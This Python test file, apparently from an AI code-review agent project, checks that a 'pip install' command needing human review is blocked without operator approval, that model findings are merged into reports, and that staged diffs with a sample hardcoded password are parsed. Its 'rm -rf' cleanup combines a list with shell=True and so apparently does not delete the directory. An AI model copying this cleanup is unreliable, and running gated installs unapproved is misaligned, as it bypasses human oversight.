@_NEEDS_TRPC
def test_agent_needs_human_review_requires_confirmation():
    """needs_human_review commands must also require operator confirmation.

    Acceptance criterion #7: deny / needs_human_review must not directly reach
    sandbox execution. Here 'pip install' (needs_human_review) is rejected
    without approval and only executes after explicit approval.
    """
    import asyncio
    from trpc_agent_sdk.types import Content, Part
    from agent.fake_model import FakeModel

    def _run(cmd, confirm_answer):
        tmpdir = Path(tempfile.mkdtemp())
        diff_file = tmpdir / 'input.diff'
        diff_file.write_text(
            'diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n'
            '@@ -0,0 +1,2 @@\n+print("hi")\n', encoding='utf-8')
        args = _make_agent_args(tmpdir)
        model = FakeModel()
        model.set_steps([
            LlmResponse(content=Content(role='model', parts=[
                Part.from_function_call(name='skill_run',
                    args={'skill': 'code-review', 'command': cmd})]),
                partial=False),
            LlmResponse(content=Content(role='model', parts=[
                Part(text='done')]), partial=False),
        ])
        from run_review import run_agent_pipeline_async
        asyncio.run(run_agent_pipeline_async(
            args, 'test-nhr', diff_file.read_text(encoding='utf-8'),
            _model_override=model, _confirm=lambda c, p: confirm_answer))
        return args

    # Rejected → needs_human_review decision recorded as denied, execution blocked.
    args_rej = _run('pip install requests', False)
    store = ReviewStore(args_rej.db)
    rej = store.get_task_details('test-nhr').get('filter_decisions', [])
    runs_rej = store.get_task_details('test-nhr').get('sandbox_runs', [])
    store.close()
    nhr_denied = [d for d in rej if d.get('action') == 'needs_human_review']
    assert nhr_denied, f'expected needs_human_review decision, got {rej}'
    assert any('no human confirmation' in (d.get('reason') or '') for d in nhr_denied)
    assert any('filter:needs_human_review' in (r.get('stdout') or '') for r in runs_rej), \
        'blocked needs_human_review command must surface a filter error'

    # Approved → decision recorded as approved; no block error.
    args_ok = _run('pip install requests', True)
    store = ReviewStore(args_ok.db)
    ok = store.get_task_details('test-nhr').get('filter_decisions', [])
    runs_ok = store.get_task_details('test-nhr').get('sandbox_runs', [])
    store.close()
    approved = [d for d in ok if d.get('action') == 'needs_human_review'
                and 'approved' in (d.get('reason') or '')]
    assert approved, f'expected approved needs_human_review decision, got {ok}'
    assert not any('filter:needs_human_review' in (r.get('stdout') or '') for r in runs_ok)


@_NEEDS_TRPC
def test_agent_llm_findings_merged():
    """LLM-structured findings must be parsed and merged into report findings."""
    import asyncio
    import json as _json
    from trpc_agent_sdk.types import Content, Part
    from agent.fake_model import FakeModel

    tmpdir = Path(tempfile.mkdtemp())
    diff_file = tmpdir / 'input.diff'
    diff_file.write_text(
        'diff --git a/a.py b/a.py\n--- a/a.py\n+++ b/a.py\n'
        '@@ -0,0 +1,3 @@\n+def f():\n+    open("x")\n+    print(1)\n',
        encoding='utf-8')
    args = _make_agent_args(tmpdir)

    model = FakeModel()
    model.set_steps([
        LlmResponse(content=Content(role='model', parts=[
            Part.from_function_call(name='skill_load',
                args={'skill_name': 'code-review'})]), partial=False),
        LlmResponse(content=Content(role='model', parts=[
            Part(text=(
                'FINDINGS_JSON\n```json\n'
                '[{"severity": "high", "category": "security", "file": "a.py", '
                '"line": 2, "title": "LLM-spotted issue", "evidence": "x", '
                '"recommendation": "fix", "confidence": 0.9}]\n```'
            ))]), partial=False),
    ])

    from run_review import run_agent_pipeline_async
    asyncio.run(run_agent_pipeline_async(args, 'test-llm-merge',
                                         diff_file.read_text(encoding='utf-8'),
                                         _model_override=model))

    report = _json.loads(
        (Path(args.output) / 'test-llm-merge' / 'review_report.json')
        .read_text(encoding='utf-8'))
    llm_findings = [f for f in report['findings'] if f.get('source') == 'llm']
    assert llm_findings, 'expected at least one source=llm finding in the report'
    assert llm_findings[0]['title'] == 'LLM-spotted issue'


def test_repo_path_includes_staged_changes():
    """--repo-path via git diff HEAD must include staged changes."""
    import subprocess
    repo_dir = Path(tempfile.mkdtemp())
    try:
        subprocess.run(['git', 'init', '-q'], cwd=repo_dir, check=True)
        subprocess.run(['git', 'config', 'user.email', 't@t.com'], cwd=repo_dir, check=True)
        subprocess.run(['git', 'config', 'user.name', 'test'], cwd=repo_dir, check=True)
        src = repo_dir / 'app.py'
        src.write_text('def add(a,b):\n    return a+b\n', encoding='utf-8')
        subprocess.run(['git', 'add', 'app.py'], cwd=repo_dir, check=True)
        subprocess.run(['git', 'commit', '-q', '-m', 'init'], cwd=repo_dir, check=True)
        # Now modify and STAGE a new dangerous line
        src.write_text('def add(a,b):\n    password = "hardcoded"\n    return a+b\n', encoding='utf-8')
        subprocess.run(['git', 'add', 'app.py'], cwd=repo_dir, check=True)
        # Run git diff HEAD — must include the staged change
        out = subprocess.run(['git', 'diff', 'HEAD'], cwd=repo_dir,
                             capture_output=True, text=True)
        assert 'hardcoded' in out.stdout, 'staged change must appear in git diff HEAD'
        # Verify our run_review --repo-path picks it up (import path guard)
        from agent.diff_parser import parse_diff
        parsed = parse_diff(out.stdout)
        texts = []
        for f in parsed['files']:
            for h in f['hunks']:
                for a in h['added_lines']:
                    texts.append(a['text'])
        assert any('hardcoded' in t for t in texts), 'review parser must see staged line'
    finally:
        subprocess.run(['rm', '-rf', str(repo_dir)], shell=True)
